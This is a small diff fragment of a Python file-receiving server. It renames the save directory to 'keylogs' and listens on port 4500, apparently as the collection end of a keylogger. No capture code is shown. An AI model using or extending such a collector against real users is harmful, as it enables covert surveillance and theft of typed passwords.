@@ -51,7 +51,7 @@ def handle_client(conn, addr, save_directory):
 
 # Main loop
 if __name__ == "__main__":
-    save_directory = ""  # Change this to the directory where you want to save received files. Leave empty for the directory of the program
+    save_directory = "keylogs"  # Change this to the directory where you want to save received files. Leave empty for the directory of the program
     host = "0.0.0.0"  # Listen on all available interfaces
     port = 4500 # Port. Can change to your liking just make SURE that the same port is set on both ends
 
